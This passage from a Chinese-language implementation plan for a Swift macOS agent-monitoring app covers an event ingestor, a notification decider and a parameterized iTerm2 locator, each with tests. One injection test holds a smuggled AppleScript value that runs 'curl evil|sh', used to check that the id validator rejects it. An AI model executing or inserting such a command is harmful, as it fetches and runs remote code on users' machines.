        _ = ing.ingest(line: Substring(line("E1", "session_start")), now: 0, replay: false)
        _ = ing.ingest(line: Substring(line("E2", "stop")), now: 0, replay: false)
        XCTAssertEqual(store.sessions.values.first?.state, .waiting(.stop))
        XCTAssertEqual(ing.consumedSeq, 2)
    }

    func test_bad_line_skipped_without_consuming_seq() {
        let store = SessionStore()
        let ing = NDJSONIngestor(store: store)
        let changes = ing.ingest(line: "garbage{", now: 0, replay: false)
        XCTAssertEqual(changes, [])
        XCTAssertEqual(ing.consumedSeq, 0)        // 坏行不占 seq
    }

    func test_multiline_text_ingest_in_order() {
        let store = SessionStore()
        let ing = NDJSONIngestor(store: store)
        let text = line("E1", "session_start") + "\n" + "broken\n" + line("E2", "stop")
        _ = ing.ingest(text: text, now: 0, replay: false)
        XCTAssertEqual(store.sessions.values.first?.state, .waiting(.stop)) // 坏行被跳过
        XCTAssertEqual(ing.consumedSeq, 2)
    }

    func test_replay_flag_is_forwarded_to_store() {
        // 通过 store 行为间接验证：回放重复 eventId 仍被去重
        let store = SessionStore()
        let ing = NDJSONIngestor(store: store)
        _ = ing.ingest(line: Substring(line("E1", "session_start")), now: 0, replay: false)
        let again = ing.ingest(line: Substring(line("E1", "stop")), now: 0, replay: true)
        XCTAssertEqual(again, [])  // 同 eventId 去重
        XCTAssertEqual(store.sessions.values.first?.state, .running)
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `swift test`
Expected: FAIL（`NDJSONIngestor` 未定义）。

- [ ] **Step 3: Write the implementation**

`Sources/AgentPetCore/Ingest/NDJSONIngestor.swift`:
```swift
import Foundation

public final class NDJSONIngestor {
    private let store: SessionStore
    private var seq: Int
    public var consumedSeq: Int { seq }

    public init(store: SessionStore, startSeq: Int = 0) {
        self.store = store
        self.seq = startSeq
    }

    @discardableResult
    public func ingest(line: Substring, now: Double, replay: Bool) -> [StoreChange] {
        guard let event = AgentEvent.decode(line: line) else { return [] } // 坏行：不占 seq
        seq += 1
        return store.apply(event, seq: seq, now: now, replay: replay)
    }

    @discardableResult
    public func ingest(text: String, now: Double, replay: Bool) -> [StoreChange] {
        var all: [StoreChange] = []
        for raw in text.split(separator: "\n", omittingEmptySubsequences: true) {
            all += ingest(line: raw, now: now, replay: replay)
        }
        return all
    }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `swift test`
Expected: PASS。

- [ ] **Step 5: Commit**

```bash
git add Sources/AgentPetCore/Ingest/NDJSONIngestor.swift Tests/AgentPetCoreTests/NDJSONIngestorTests.swift
git commit -m "feat(core): NDJSONIngestor 赋单调 seq(append 顺序为真) + 坏行跳过 + 回放转发"
```

---

### Task 9: 通知决策（NotificationDecider）

**Files:**
- Create: `Sources/AgentPetCore/Notify/NotificationDecider.swift`
- Test: `Tests/AgentPetCoreTests/NotificationDeciderTests.swift`

**Interfaces:**
- Consumes: `AgentEvent`, `Session`
- Produces:
  - `enum NotifyMode { case attentionOnly, everyStop }`
  - `struct NotificationContent: Equatable { let title: String; let body: String }`
  - `struct NotificationDecision: Equatable { let shouldNotify: Bool; let content: NotificationContent? }`
  - `enum NotificationDecider { static func decide(event:session:mode:replay:) -> NotificationDecision }`

- [ ] **Step 1: Write the failing test**

`Tests/AgentPetCoreTests/NotificationDeciderTests.swift`:
```swift
import XCTest
@testable import AgentPetCore

final class NotificationDeciderTests: XCTestCase {
    private func ev(_ kind: EventKind, notify: NotifyClass? = nil, title: String? = "Proj") -> AgentEvent {
        AgentEvent(v: 1, eventId: "E", agent: "a", kind: kind, sessionId: "S", root: "r",
                   title: title, notify: notify, ts: "t")
    }
    private let sess = Session(key: SessionKey(agent: "a", root: "r", sessionId: "S"),
                               state: .waiting(.attention), title: "Proj", lastSeq: 1, lastActiveAt: 0)

    func test_attention_rings_in_default_mode() {
        let d = NotificationDecider.decide(event: ev(.attention), session: sess, mode: .attentionOnly, replay: false)
        XCTAssertTrue(d.shouldNotify)
        XCTAssertEqual(d.content?.title, "Proj")
    }

    func test_stop_silent_in_default_mode() {
        let d = NotificationDecider.decide(event: ev(.stop), session: sess, mode: .attentionOnly, replay: false)
        XCTAssertFalse(d.shouldNotify)
    }

    func test_stop_rings_in_everyStop_mode() {
        let d = NotificationDecider.decide(event: ev(.stop), session: sess, mode: .everyStop, replay: false)
        XCTAssertTrue(d.shouldNotify)
    }

    func test_notify_none_override_silences_attention() {
        let d = NotificationDecider.decide(event: ev(.attention, notify: NotifyClass.none), session: sess, mode: .attentionOnly, replay: false)
        XCTAssertFalse(d.shouldNotify)
    }

    func test_notify_alert_override_rings_stop_even_in_default_mode() {
        let d = NotificationDecider.decide(event: ev(.stop, notify: .alert), session: sess, mode: .attentionOnly, replay: false)
        XCTAssertTrue(d.shouldNotify)
    }

    func test_replay_never_rings() {
        let d = NotificationDecider.decide(event: ev(.attention), session: sess, mode: .attentionOnly, replay: true)
        XCTAssertFalse(d.shouldNotify)
    }

    func test_busy_and_start_never_ring() {
        XCTAssertFalse(NotificationDecider.decide(event: ev(.busy), session: sess, mode: .everyStop, replay: false).shouldNotify)
        XCTAssertFalse(NotificationDecider.decide(event: ev(.sessionStart), session: sess, mode: .everyStop, replay: false).shouldNotify)
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `swift test`
Expected: FAIL（`NotificationDecider` 未定义）。

- [ ] **Step 3: Write the implementation**

`Sources/AgentPetCore/Notify/NotificationDecider.swift`:
```swift
public enum NotifyMode { case attentionOnly, everyStop }

public struct NotificationContent: Equatable {
    public let title: String
    public let body: String
    public init(title: String, body: String) { self.title = title; self.body = body }
}

public struct NotificationDecision: Equatable {
    public let shouldNotify: Bool
    public let content: NotificationContent?
    public init(shouldNotify: Bool, content: NotificationContent? = nil) {
        self.shouldNotify = shouldNotify; self.content = content
    }
}

public enum NotificationDecider {
    public static func decide(event: AgentEvent, session: Session?,
                              mode: NotifyMode, replay: Bool) -> NotificationDecision {
        if replay { return NotificationDecision(shouldNotify: false) }

        // 显式 notify 覆盖优先
        if let n = event.notify {
            switch n {
            case .none:    return NotificationDecision(shouldNotify: false)
            case .alert:   return ring(event, session, "")
            case .passive: break  // passive 走默认分类逻辑
            }
        }

        switch event.kind {
        case .attention:
            return ring(event, session, "需要你输入")
        case .stop:
            return mode == .everyStop ? ring(event, session, "本轮已完成") : NotificationDecision(shouldNotify: false)
        case .pluginError:
            return ring(event, session, event.message ?? "插件错误")
        case .sessionStart, .busy, .sessionEnd, .unknown:
            return NotificationDecision(shouldNotify: false)
        }
    }

    private static func ring(_ event: AgentEvent, _ session: Session?, _ defaultBody: String) -> NotificationDecision {
        let title = event.title ?? session?.title ?? event.agent
        let body = defaultBody.isEmpty ? (event.title ?? "需要你关注") : defaultBody
        return NotificationDecision(shouldNotify: true,
                                    content: NotificationContent(title: title, body: body))
    }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `swift test`
Expected: PASS。

- [ ] **Step 5: Commit**

```bash
git add Sources/AgentPetCore/Notify/NotificationDecider.swift Tests/AgentPetCoreTests/NotificationDeciderTests.swift
git commit -m "feat(core): NotificationDecider(默认 attention 响、everyStop 加 stop、notify 覆盖、replay 静默)"
```

---

### Task 10: 终端定位器 — iTerm2 参数化跳转脚本 + ref 校验

**Files:**
- Create: `Sources/AgentPetCore/Terminal/TerminalLocator.swift`
- Test: `Tests/AgentPetCoreTests/ITerm2LocatorTests.swift`

**Interfaces:**
- Consumes: `TerminalRef`, `TerminalKind`
- Produces:
  - `struct ScriptInvocation: Equatable { let executable: String; let arguments: [String] }`
  - `enum LocatorCapability { case precise, activateOnly }`
  - `enum LocatorError: Error, Equatable { case invalidRef, missingRef }`
  - `protocol TerminalLocator { var kind; var capability; func focusInvocation(for:) throws -> ScriptInvocation }`
  - `struct ITerm2Locator: TerminalLocator`
  - `enum ITermSessionId { static func isValid(_:) -> Bool }`

- [ ] **Step 1: Write the failing test**

`Tests/AgentPetCoreTests/ITerm2LocatorTests.swift`:
```swift
import XCTest
@testable import AgentPetCore

final class ITerm2LocatorTests: XCTestCase {
    func test_valid_ref_builds_parameterized_osascript_invocation() throws {
        let loc = ITerm2Locator()
        let ref = TerminalRef(kind: .iterm2, itermSessionId: "w0t1p0:ABCD-1234")
        let inv = try loc.focusInvocation(for: ref)
        XCTAssertEqual(inv.executable, "/usr/bin/osascript")
        // 脚本本体 + "-" + 分隔 + id 作为独立 argv（参数化，未内插）
        XCTAssertTrue(inv.arguments.contains("w0t1p0:ABCD-1234"))
        // 脚本本体里不得出现被内插的 id
        let script = inv.arguments.first ?? ""
        XCTAssertFalse(script.contains("w0t1p0:ABCD-1234"))
        XCTAssertTrue(script.contains("on run argv"))
    }

    func test_injection_attempt_in_ref_is_rejected() {
        let loc = ITerm2Locator()
        let evil = TerminalRef(kind: .iterm2,
            itermSessionId: "x\" \n do shell script \"curl evil|sh\" \n \"")
        XCTAssertThrowsError(try loc.focusInvocation(for: evil)) { err in
            XCTAssertEqual(err as? LocatorError, .invalidRef)
        }
    }

    func test_missing_iterm_session_id_throws() {
        let loc = ITerm2Locator()
        XCTAssertThrowsError(try loc.focusInvocation(for: TerminalRef(kind: .iterm2))) { err in
            XCTAssertEqual(err as? LocatorError, .missingRef)
        }
    }

    func test_capability_is_precise() {
        XCTAssertEqual(ITerm2Locator().capability, .precise)
        XCTAssertEqual(ITerm2Locator().kind, .iterm2)
    }

    func test_id_validator_rejects_quotes_spaces_newlines() {
        XCTAssertTrue(ITermSessionId.isValid("w0t1p0:ABCD-1234"))
        XCTAssertTrue(ITermSessionId.isValid("w0t1p0"))
        XCTAssertFalse(ITermSessionId.isValid("a b"))
        XCTAssertFalse(ITermSessionId.isValid("a\"b"))
        XCTAssertFalse(ITermSessionId.isValid("a\nb"))
        XCTAssertFalse(ITermSessionId.isValid(""))
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `swift test`
Expected: FAIL（`ITerm2Locator` 等未定义）。

- [ ] **Step 3: Write the implementation**

`Sources/AgentPetCore/Terminal/TerminalLocator.swift`:
```swift
import Foundation

public struct ScriptInvocation: Equatable {
    public let executable: String
    public let arguments: [String]
    public init(executable: String, arguments: [String]) {
        self.executable = executable; self.arguments = arguments
    }
}

public enum LocatorCapability { case precise, activateOnly }
public enum LocatorError: Error, Equatable { case invalidRef, missingRef }

public protocol TerminalLocator {
    var kind: TerminalKind { get }
    var capability: LocatorCapability { get }
    func focusInvocation(for ref: TerminalRef) throws -> ScriptInvocation
}

/// iTerm2 session id 白名单校验：只允许字母数字与 ` : _ - `，杜绝引号/空格/换行注入。
public enum ITermSessionId {
    public static func isValid(_ s: String) -> Bool {
        guard !s.isEmpty else { return false }
        return s.allSatisfy { c in
            c.isLetter || c.isNumber || c == ":" || c == "_" || c == "-"
        }
    }
}

public struct ITerm2Locator: TerminalLocator {
    public init() {}
    public var kind: TerminalKind { .iterm2 }
    public var capability: LocatorCapability { .precise }

    /// 参数化 AppleScript：id 经 argv 传入，绝不字符串内插。设计 §3.1 / §7。
    private static let script = """
    on run argv
        set targetId to item 1 of argv
        tell application "iTerm2"
            repeat with w in windows
                repeat with t in tabs of w
                    repeat with s in sessions of t
                        if (id of s) is targetId then
                            select w
                            select t
                            activate
                            return
                        end if
                    end repeat
                end repeat
            end repeat
        end tell
    end run
    """

    public func focusInvocation(for ref: TerminalRef) throws -> ScriptInvocation {
        guard let id = ref.itermSessionId else { throw LocatorError.missingRef }
        guard ITermSessionId.isValid(id) else { throw LocatorError.invalidRef }
        // osascript -  <id>   ：脚本读 stdin，id 作为 argv（"-" 表示从 stdin 读脚本）
        return ScriptInvocation(executable: "/usr/bin/osascript",
                                arguments: [Self.script, id])
    }
}
```
> 说明：`arguments` 第一项是脚本全文、第二项是已校验的 id。Plan B 的执行层用 `Process` 调 `/usr/bin/osascript -` 把 `arguments[0]` 写 stdin、`arguments[1...]` 作为 `argv` 传入（`on run argv`）。本 Task 只断言**构造**正确（参数化、id 不内插），不真的启动 iTerm2。

- [ ] **Step 4: Run test to verify it passes**

Run: `swift test`
Expected: PASS。

- [ ] **Step 5: Commit**

```bash
git add Sources/AgentPetCore/Terminal/TerminalLocator.swift Tests/AgentPetCoreTests/ITerm2LocatorTests.swift
git commit -m "feat(core): ITerm2Locator 参数化跳转脚本 + session id 白名单校验(防注入)"
```

---

## Self-Review

**Spec coverage（对照设计文档）：**
- §3 事件协议字段 → Task 1（含未知事件保留、可选字段、terminal 类型化）✅
- §4 去重(eventId)/排序(seq)/字段合并/终态/busy 短路/回放 → Task 4、5、8 ✅
- §6 全量状态机（start/busy/stop/attention/end/未知 + WAITING reason + STALE 可复活/ENDED 终态）→ Task 3、4、7 ✅
- §6 聚合三态 → Task 6 ✅
- §7 终端跳转 iTerm2 精确 + 能力声明 + bundleId 降级（bundleId 字段在 Task 1 已建模；其它终端 Locator 属 M3，本计划只实现 iTerm2）✅（部分，按 M1 范围）
- §3.1/§7 AppleScript 参数化防注入 → Task 10 ✅
- §10 测试：SessionStore 状态机/去重排序/合并、Ingestor 坏行/乱序、Locator 注入用例、Notify 模式矩阵 → Task 3–10 全覆盖 ✅
- **本计划不含**（属 Plan B / M2+）：FSEvents 文件监听、归档 checkpoint 落盘、真实 osascript 执行、hook 脚本与安装器、UNUserNotificationCenter 真实投递、GUI（宠物窗/菜单栏/面板）、多根扫描、jsonl 兜底、PhotoRenderer、安全基线 §3.1 实现。

**Placeholder scan：** 无 TODO/TBD；每个代码步骤含完整可编译 Swift。

**Type consistency：** `apply(_:seq:now:replay:)`、`StoreChange.upserted`、`SessionKey(event:)`、`PetState`、`ScriptInvocation`、`NotificationDecision` 在各 Task 间签名一致；`NotifyClass.none` 在 Task 9 测试中用 `NotifyClass.none` 全限定（避免与 `Optional.none` 歧义）。

> **遗留澄清（不阻塞实现，Plan B 处理）**：`ITerm2Locator` 用 `id of s` 匹配，而 Claude hook 拿到的是 `$ITERM_SESSION_ID`（形如 `w0t1p0:UUID`）。二者映射关系需在 Plan B 的 hook 脚本/执行层确认（可能需取冒号后段或用 iTerm2 `unique id`）。本计划的单测只验证构造与防注入，不受影响。
